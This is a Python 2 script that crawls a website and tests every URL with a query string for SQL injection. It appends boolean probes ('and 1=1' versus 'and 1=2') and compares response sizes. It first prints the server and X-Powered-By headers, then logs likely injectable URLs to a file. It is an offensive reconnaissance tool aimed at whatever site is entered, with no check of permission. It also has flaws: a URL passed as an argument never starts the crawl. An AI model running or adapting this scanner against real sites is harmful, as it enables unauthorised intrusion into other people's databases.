#!/usr/bin/env python
#encoding=utf-8

'''
function:it can traversal a website and find the injectable points.
author:jaffer
time:2014-05-06
'''

import re
import httplib2
import urllib2
import urllib
from sys import argv
from os import makedirs,unlink,sep
from os.path import dirname,exists,isdir,splitext
from string import replace,find,lower
from htmllib import HTMLParser
from urllib import urlretrieve
from urllib import urlopen
from urlparse import urlparse,urljoin
from formatter import DumbWriter,AbstractFormatter
from cStringIO import StringIO
import sys 

reload(sys) 
sys.setdefaultencoding('utf8')

class Getserver(object):
	def __init__(self,url):
		self.url = url
	
	def getInfo(self):
		h = httplib2.Http()
		res,con = h.request(self.url,'GET')
		servertype = res['server']
		webtype = res['x-powered-by']
		print 'the type of server is :'+servertype
		print 'the type of web powered by '+webtype
		print '\nplease wait......'


class Getsize(object):
	def __init__(self,url,houzui):
		self.url = url+houzui
	def getFileSize(self):
		h = httplib2.Http()
		res,con = h.request(self.url,'GET')
		fileSize = res['content-length']
		return int(fileSize)

class Modifyurl(object):
	
	def __init__(self,url):
		self.url = url
		self.pattern = re.compile(r'http://[0-9a-zA-Z._/]*\?[a-zA-Z_]*=[0-9a-zA-Z_]*[0-9a-zA-Z._/=&]*')
	def isValidUrl(self):
		match = self.pattern.match(self.url)
		if match:
			return 1
		else:
			return 0
	def isGoodUrl(self):
		pat=re.compile(r'[0-9a-zA-Z._/\?:=&@]*\.(jpg|swf|gif|cer|png|doc|xls|ppt|pptx|docs|rar|zip|pdf|chm)')
		match = pat.match(self.url)
		if match:
			return 1
		else:
			return 0

class Retriever(object):
	def __init__(self,url):
		self.url = url

	#parse HTML ,save links
	def parseAndGetLinks(self):
		self.parser = HTMLParser(AbstractFormatter(DumbWriter(StringIO())))
		self.parser.feed(urlopen(self.url).read())
		self.parser.close()
		return self.parser.anchorlist

#manage entire crawler
class Crawler(object):
	count = 0
	def __init__(self,url):
		self.q = [url]
		self.seen = []
		self.dom = urlparse(url)[1]

	def getPage(self,url):
		r = Retriever(url)
		Crawler.count += 1
		self.seen.append(url)

		links = r.parseAndGetLinks()
		for eachLink in links:
			if eachLink in links:
				if eachLink[:4] != 'http' and find(eachLink,'://') == -1:
					eachLink = urljoin(url,eachLink)
				if find(lower(eachLink),'mailto:') != -1:
					continue
			if eachLink not in self.seen:
				if find(eachLink,self.dom) == -1:
					pass
				else:
					if eachLink not in self.q:
						self.q.append(eachLink)
					else:
						pass
			else:
				pass
		

	def go(self):
		flag = 1
		first = 0
		while self.q:
			url = self.q.pop()
			if first == 0:
				info = Getserver(url)
				infomation = info.getInfo()
				first = 1
			Goodurl = Modifyurl(url)
			goodu = Goodurl.isGoodUrl()
			if goodu == 1:
				continue
			self.getPage(url)
			good = Goodurl.isValidUrl()
			try:
				injection = open('injection','a')
				flag = 0
			except IOError:
				print 'file open failed.'
				break
			if good == 1:
				#进行sql注入测试
				size_1 = Getsize(url,'%20and%201=1')
				size_2 = Getsize(url,'%20and%201=2')
				size_3 = Getsize(url,'')
				size1 = size_1.getFileSize()
				size2 = size_2.getFileSize()
				size3 = size_3.getFileSize()
				if size1 != size2 and size1 == size3:
					print '\nthe posible injection points:\n'+url
					injection.write(url+'\n')
		if flag == 0:
			injection.close()

def main():
	if len(argv) > 1:
		url = argv[1]
	else:
		try:
			url = raw_input('Enter starting URL:')
		except (KeyboardInterrupt,EOFError):
			url = ''
		if not url:
			return
		robot = Crawler(url)
		robot.go()


if __name__ == '__main__':
	main()
	print '\nover \n the possible injection points are in the file injection.please input enter to quit'
	raw_input()





